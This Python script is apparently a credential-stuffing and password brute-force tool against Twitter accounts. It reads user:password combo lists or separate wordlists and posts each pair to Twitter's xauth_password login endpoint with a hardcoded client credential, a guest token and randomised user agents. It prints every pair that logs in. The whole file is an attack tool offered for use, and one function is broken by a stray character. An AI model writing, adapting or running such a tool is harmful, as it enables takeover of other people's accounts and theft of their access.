import os 
try: 
	import requests
	from user_agent import generate_user_agent
except :
	os.system('pip install user_agent')

done,bad=0,0
BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # 'هGreen
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
def comdo(user_f , password_f):
	try :
		for i in range(0,10000):
			
			Pas = open(password_f, "r").read().splitlines()
			Pass=Pas[i]
			use = open(user_f, "r").read().splitlines()
			user=useه[i]
			with open("Fx.txt","a")as save:
				save.write(user+':'+Pass+'\n')
	except :
		pass
print(BRed+f'''
 █████╗  ██████╗ ███╗   ███╗
██╔══██╗██╔═══██╗████╗ ████║
███████║██║   ██║██╔████╔██║
██╔══██║██║   ██║██║╚██╔╝██║
██║  ██║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝ ╚═════╝ ██║     ██║

████████╗ ██████╗ ████████╗ ██████╗ 
╚══██╔══╝██╔═══██╗╚══██╔══╝██╔═══██╗
   ██║   ██║   ██║   ██║   ██║   ██║
   ██║   ██║   ██║   ██║   ██║   ██║
   ██║   ╚██████╔╝   ██║   ╚██████╔╝
   ╚═╝    ╚═════╝    ╚═╝    ╚═════╝ 
   
   
{BWhite} 
=====================================
{BRed}[{BWhite}1{BRed}]{BYellow} - COMBO FILE 
{BRed}[{BWhite}2{BRed}]{BYellow} - PASS & USERNAME FILE 
{BRed}[{BWhite}3{BRed}]{BYellow} - USER & PASSWORD FILE 
{BRed}[{BWhite}4{BRed}]{BYellow} - PASSWORD FILE AND USERNAME FILE 
{BWhite}======================================
	''')
g=int(input(BWhite+f'[{BYellow}+{BWhite}] - {BCyan}Choose : {BWhite}'))
if g == 4 :
	user_f= input(BWhite+f'[{BYellow}+{BWhite}] - {BCyan}username file : {BWhite}')
	password_f=input(BWhite+f'[{BYellow}+{BWhite}] - {BCyan}password file : {BWhite}')
	comdo(user_f,password_f)
	flename='Fx.txt'
	headers = {
		"Content-Type":"application/x-www-form-urlencoded",
		"User-Agent": generate_user_agent(),
		"Timezone": "Asia/Shanghai",
		"Accept": "application/json",
		"Authorization": "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw=="
		}
	Token = requests.post("https://api.twitter.com/oauth2/token", data={"grant_type":"client_credentials"}, headers=headers).json()["access_token"]
	
	headers = {
		"Content-Type":"text/plain",
		"User-Agent": generate_user_agent(),
		"Timezone": "Asia/Shanghai",
		"Accept": "application/json",
		"Authorization": f"Bearer {Token}"
		}
	Guest = requests.post("https://api.twitter.com/1.1/guest/activate.json", headers=headers).json()["guest_token"]
	
	file = open(flename,"r").read().splitlines()
	for yaser in file:
		user = yaser.split(":")[0]
		Pass = yaser.split(":")[1]
		link = 'https://api.twitter.com/auth/1/xauth_password.json'
		headers = {
			"Content-Type":"application/x-www-form-urlencoded",
			'User-Agent': generate_user_agent(),
			"Timezone": "Asia/Shanghai",
			"Accept": "application/json",
			"X-Guest-Token":Guest,
			"Authorization": f"Bearer {Token}"}
		data=f"x_auth_identifier={user}&x_auth_password={Pass}&send_error_codes=true&x_auth_login_challenge=1&x_auth_login_verification=1&ui_metrics="
		eee = requests.post(link,headers=headers,data=data).text
		if "oauth_token" in eee:
			done+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
			print('\n\n\n'+BGreen+user+':'+Pass)
		elif "parameter is missing" in eee:
			bad+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
		elif "Could not authenticate you" in eee:
			bad+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
		elif "login_verification_request_id" in eee:
			done+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
			print('\n\n\n'+BGreen+user+':'+Pass)
			
		else:
			bad+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')















if g == 1 :
	flename = input(BWhite+f'[{BYellow}+{BWhite}] - {BCyan}name file combo : {BWhite}')
	headers = {
		"Content-Type":"application/x-www-form-urlencoded",
		"User-Agent": generate_user_agent(),
		"Timezone": "Asia/Shanghai",
		"Accept": "application/json",
		"Authorization": "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw=="
		}
	Token = requests.post("https://api.twitter.com/oauth2/token", data={"grant_type":"client_credentials"}, headers=headers).json()["access_token"]
	
	headers = {
		"Content-Type":"text/plain",
		"User-Agent": generate_user_agent(),
		"Timezone": "Asia/Shanghai",
		"Accept": "application/json",
		"Authorization": f"Bearer {Token}"
		}
	Guest = requests.post("https://api.twitter.com/1.1/guest/activate.json", headers=headers).json()["guest_token"]
	
	file = open(flename,"r").read().splitlines()
	for yaser in file:
		user = yaser.split(":")[0]
		Pass = yaser.split(":")[1]
		link = 'https://api.twitter.com/auth/1/xauth_password.json'
		headers = {
			"Content-Type":"application/x-www-form-urlencoded",
			'User-Agent': generate_user_agent(),
			"Timezone": "Asia/Shanghai",
			"Accept": "application/json",
			"X-Guest-Token":Guest,
			"Authorization": f"Bearer {Token}"}
		data=f"x_auth_identifier={user}&x_auth_password={Pass}&send_error_codes=true&x_auth_login_challenge=1&x_auth_login_verification=1&ui_metrics="
		eee = requests.post(link,headers=headers,data=data).text
		if "oauth_token" in eee:
			done+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
			print('\n\n\n'+BGreen+user+':'+Pass)
		elif "parameter is missing" in eee:
			bad+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
		elif "Could not authenticate you" in eee:
			bad+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
		elif "login_verification_request_id" in eee:
			done+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
			print('\n\n\n'+BGreen+user+':'+Pass)
		else:
			bad+=1
			print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')









if g ==2:
	flename = input(BWhite+f'[{BYellow}+{BWhite}] - {BCyan}Password file  : {BWhite}')
	user = input(BWhite+f'[{BYellow}+{BWhite}] - {BCyan}User Target : {BWhite}')
	
	for i in range(0,10000):
			Pas = open(flename, "r").read().splitlines()
			Pass=Pas[i]
			
			headers = {
				"Content-Type":"application/x-www-form-urlencoded",
				"User-Agent": generate_user_agent(),
				"Timezone": "Asia/Shanghai",
				"Accept": "application/json",
				"Authorization": "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw=="
				}
			Token = requests.post("https://api.twitter.com/oauth2/token", data={"grant_type":"client_credentials"}, headers=headers).json()["access_token"]
			
			headers = {
				"Content-Type":"text/plain",
				"User-Agent": generate_user_agent(),
				"Timezone": "Asia/Shanghai",
				"Accept": "application/json",
				"Authorization": f"Bearer {Token}"
				}
			Guest = requests.post("https://api.twitter.com/1.1/guest/activate.json", headers=headers).json()["guest_token"]
			
			link = 'https://api.twitter.com/auth/1/xauth_password.json'
			headers = {
				"Content-Type":"application/x-www-form-urlencoded",
				'User-Agent': generate_user_agent(),
				"Timezone": "Asia/Shanghai",
				"Accept": "application/json",
				"X-Guest-Token":Guest,
				"Authorization": f"Bearer {Token}"}
			data=f"x_auth_identifier={user}&x_auth_password={Pass}&send_error_codes=true&x_auth_login_challenge=1&x_auth_login_verification=1&ui_metrics="
			eee = requests.post(link,headers=headers,data=data).text
			if "oauth_token" in eee:
				done+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
				print('\n\n\n'+BGreen+user+':'+Pass)
			elif "parameter is missing" in eee:
				bad+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
			elif "Could not authenticate you" in eee:
				bad+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
			elif "login_verification_request_id" in eee:
				done+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
				print('\n\n\n'+BGreen+user+':'+Pass)
			else:
				bad+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')



















if g ==3 :
	flename = input(BWhite+f'[{BYellow}+{BWhite}] - {BCyan}username file  :{BWhite} ')
	Pass = input(BWhite+f'[{BYellow}+{BWhite}] - {BCyan}Password Target : {BWhite}')
	try:
	 for i in range(0,10000):
			use = open(flename, "r").read().splitlines()
			user=use[i]
			
			headers = {
				"Content-Type":"application/x-www-form-urlencoded",
				"User-Agent": generate_user_agent(),
				"Timezone": "Asia/Shanghai",
				"Accept": "application/json",
				"Authorization": "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw=="
				}
			Token = requests.post("https://api.twitter.com/oauth2/token", data={"grant_type":"client_credentials"}, headers=headers).json()["access_token"]
			
			headers = {
				"Content-Type":"text/plain",
				"User-Agent": generate_user_agent(),
				"Timezone": "Asia/Shanghai",
				"Accept": "application/json",
				"Authorization": f"Bearer {Token}"
				}
			Guest = requests.post("https://api.twitter.com/1.1/guest/activate.json", headers=headers).json()["guest_token"]
			
			link = 'https://api.twitter.com/auth/1/xauth_password.json'
			headers = {
				"Content-Type":"application/x-www-form-urlencoded",
				'User-Agent': generate_user_agent(),
				"Timezone": "Asia/Shanghai",
				"Accept": "application/json",
				"X-Guest-Token":Guest,
				"Authorization": f"Bearer {Token}"}
			data=f"x_auth_identifier={user}&x_auth_password={Pass}&send_error_codes=true&x_auth_login_challenge=1&x_auth_login_verification=1&ui_metrics="
			eee = requests.post(link,headers=headers,data=data).text
			if "oauth_token" in eee:
				done+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
				print('\n\n\n'+BGreen+user+':'+Pass)
			elif "parameter is missing" in eee:
				bad+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
			elif "Could not authenticate you" in eee:
				bad+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
			elif "login_verification_request_id" in eee:
				done+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
				print('\n\n\n'+BGreen+user+':'+Pass)
			else:
				bad+=1
				print(f'\r{BWhite}[+] - {BGreen}Done [{done}] {BWhite}| {BRed}Bad [{bad}]',end='')
	except :
		pass




